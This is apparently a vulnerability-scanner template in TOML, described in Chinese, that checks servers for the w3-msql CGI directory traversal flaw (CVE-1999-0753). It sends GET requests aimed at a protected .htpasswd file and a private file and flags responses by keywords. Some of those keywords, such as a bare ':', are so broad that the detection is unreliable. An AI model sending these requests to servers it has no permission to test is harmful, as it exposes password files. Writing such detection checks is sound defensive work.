[info]
author = "AVE"
description = "检测目标服务器上 w3-msql CGI 脚本是否存在目录遍历漏洞。通过向 w3-msql 脚本发送特制 HTTP 请求，尝试访问受 .htaccess 保护的目录中的文件（如 .htpasswd），验证是否存在信息泄露风险。"
id = "POC-AVE-1999-0606"
name = "Hughes Technologies Mini SQL w3-msql CGI 目录遍历漏洞 PoC"
severity = "high"
tags = [
    "cve-1999-0753",
    "msql",
    "directory-traversal",
    "cgi",
]
vuln_id = [
    "CVE-1999-0753",
    "AVE-1999-0606",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/w3-msql/protected-directory/.htpasswd"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "root:",
    "admin:",
    "www:",
    ":",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/w3-msql/protected-directory/private-file"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Index of",
    "Directory listing",
    "parent directory",
]
